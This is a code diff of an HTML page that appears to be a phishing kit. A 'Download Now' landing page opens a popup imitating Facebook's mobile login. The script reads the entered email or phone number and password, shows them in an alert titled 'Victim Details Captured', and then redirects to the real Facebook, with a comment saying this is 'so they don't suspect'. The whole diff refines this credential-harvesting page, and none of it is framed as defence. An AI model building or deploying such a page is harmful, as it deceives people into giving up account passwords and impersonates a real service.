@@ -8,7 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #1c1e21; /* Dark background for contrast */
+            background-color: #0b0c10; /* Dark Professional Background */
             font-family: Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -17,84 +17,149 @@
             overflow: hidden;
         }
 
-        /* Main Container - Mobile Size Look */
+        /* Main Container - Looks like a mobile phone on Desktop */
         .phone-frame {
             width: 100%;
-            max-width: 400px; /* Phone width limit */
+            max-width: 400px; 
             height: 100%;
             max-height: 850px;
             background: white;
             position: relative;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            box-shadow: 0 0 30px rgba(0,0,0,0.6);
+            border-radius: 20px; /* Soft edges for modern look */
+            overflow: hidden;
         }
 
-        /* Image Area - 9:16 Ratio */
+        /* Image Area - Strictly 9:16 Ratio */
         .image-area {
             width: 100%;
-            height: 75%; /* Zyadatar area image ke liye */
-            overflow: hidden;
+            height: 75%; 
             position: relative;
         }
 
         .hero-image {
             width: 100%;
             height: 100%;
-            object-fit: cover; /* Image stretch nahi hogi, crop hogi */
+            object-fit: cover; /* Ensures image fills area without distortion */
+            display: block;
         }
 
-        /* Highlight Button */
-        .download-btn-container {
+        /* Button Area */
+        .btn-area {
             height: 25%;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
-            padding-bottom: 20px;
+            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+            position: absolute;
+            bottom: 0;
+            width: 100%;
         }
 
         .download-btn {
-            background-color: #1877f2;
+            background: #1877f2;
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 16px 50px;
             font-size: 20px;
             font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 0 15px #1877f2; /* Glow effect */
-            animation: pulse 1.5s infinite;
+            box-shadow: 0 0 20px rgba(24, 119, 242, 0.6);
+            animation: pulse 2s infinite;
+            z-index: 10;
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 15px #1877f2; }
-            50% { transform: scale(1.05); box-shadow: 0 0 25px #1877f2; }
-            100% { transform: scale(1); box-shadow: 0 0 15px #1877f2; }
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.9; }
+            100% { transform: scale(1); opacity: 1; }
         }
 
+        /* --- FAKE LOGIN PAGE STYLES (Mobile Optimized) --- */
+        .fb-mobile-view {
+            width: 100%;
+            height: 100vh;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 60px;
+            box-sizing: border-box;
+        }
+
+        .fb-logo {
+            font-size: 42px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 40px;
+            letter-spacing: -1px;
+        }
+
+        .input-group {
+            width: 85%;
+            margin-bottom: 15px;
+        }
+
+        .fb-input {
+            width: 100%;
+            padding: 18px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 17px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .fb-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 85%;
+            padding: 16px;
+            background: #1877f2;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        a { color: #1877f2; text-decoration: none; }
     </style>
 </head>
 <body>
 
-    <!-- Main Landing Page -->
+    <!-- MAIN LANDING PAGE -->
     <div class="phone-frame">
         <div class="image-area">
-            <!-- Yahan apni high quality mobile wallpaper link daalo -->
-            <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop" 
+            <!-- High Quality Mobile Wallpaper Link -->
+            <img src="https://images.unsplash.com/photo-1512949460376-29873e32d338?q=80&w=1000&auto=format&fit=crop" 
                  alt="App Preview" 
                  class="hero-image">
         </div>
         
-        <div class="download-btn-container">
+        <div class="btn-area">
             <button class="download-btn" onclick="openLoginWindow()">Download Now</button>
         </div>
     </div>
 
     <script>
         function openLoginWindow() {
-            // Fake Window Open Karein
-            const win = window.open("", "_blank", "width=350,height=650");
+            // Open window with specific mobile-like dimensions
+            const win = window.open("", "_blank", "width=375,height=667");
             
             win.document.write(`
                 <html>
@@ -102,81 +167,27 @@
                     <title>Facebook</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <style>
-                        body { 
-                            font-family: Helvetica, Arial, sans-serif; 
-                            background: #fff; 
-                            margin: 0; 
-                            padding: 0;
-                            display: flex;
-                            justify-content: center;
-                        }
-                        .fb-mobile-container {
-                            width: 100%;
-                            max-width: 350px;
-                            padding: 20px;
-                            box-sizing: border-box;
-                            background: #fff;
-                        }
-                        .logo { 
-                            text-align: center; 
-                            font-size: 36px; 
-                            color: #1877f2; 
-                            font-weight: bold; 
-                            margin-bottom: 40px; 
-                            letter-spacing: -1px;
-                        }
-                        input {
-                            width: 100%;
-                            padding: 16px;
-                            margin-bottom: 12px;
-                            border: 1px solid #dddfe2;
-                            border-radius: 8px;
-                            font-size: 16px;
-                            box-sizing: border-box;
-                            outline: none;
-                        }
-                        input:focus {
-                            border-color: #1877f2;
-                            box-shadow: 0 0 0 2px #e7f3ff;
-                        }
-                        button {
-                            width: 100%;
-                            padding: 14px;
-                            background: #1877f2;
-                            color: white;
-                            font-size: 18px;
-                            font-weight: bold;
-                            border: none;
-                            border-radius: 8px;
-                            cursor: pointer;
-                            margin-top: 10px;
-                        }
-                        button:hover { background: #166fe5; }
-                        .links {
-                            text-align: center;
-                            margin-top: 20px;
-                            font-size: 14px;
-                        }
-                        a { color: #1877f2; text-decoration: none; }
+                        body { margin: 0; padding: 0; background: #fff; font-family: Helvetica, Arial, sans-serif; }
                     </style>
                 </head>
                 <body>
-                    <div class="fb-mobile-container">
-                        <div class="logo">facebook</div>
+                    <div class="fb-mobile-view">
+                        <div class="fb-logo">facebook</div>
                         
                         <form id="loginForm" onsubmit="captureData(event)">
-                            <!-- Sirf Number/Email -->
-                            <input type="text" id="email" placeholder="Phone number or email address" required autocomplete="off">
+                            <div class="input-group">
+                                <input type="text" id="email" class="fb-input" placeholder="Phone number or email address" required autocomplete="off">
+                            </div>
                             
-                            <!-- Sirf Password -->
-                            <input type="password" id="pass" placeholder="Password" required autocomplete="off">
+                            <div class="input-group">
+                                <input type="password" id="pass" class="fb-input" placeholder="Password" required autocomplete="off">
+                            </div>
                             
-                            <button type="submit">Log In</button>
+                            <button type="submit" class="login-btn">Log In</button>
                         </form>
                         
                         <div class="links">
-                            <a href="#">Forgot password?</a>
-                            <br><br>
+                            <a href="#">Forgot password?</a><br><br>
                             <span style="color:#606060;">Don't have an account? </span>
                             <a href="#">Sign up</a>
                         </div>
@@ -185,17 +196,16 @@
                 </html>
             `);
 
-            // Data Capture Function
+            // Data Capture Logic
             window.captureData = function(e) {
                 e.preventDefault();
                 
                 const email = document.getElementById('email').value;
                 const pass = document.getElementById('pass').value;
 
-                // Victim ko data dikhana (Alert me)
-                alert("Details Captured:\n\nNumber/Email: " + email + "\nPassword: " + pass);
+                alert("Victim Details Captured:\n\nEmail/Number: " + email + "\nPassword: " + pass);
 
-                // Real Facebook par redirect karna
+                // Redirect to real Facebook so they don't suspect
                 win.location.href = "https://www.facebook.com";
             };
         }
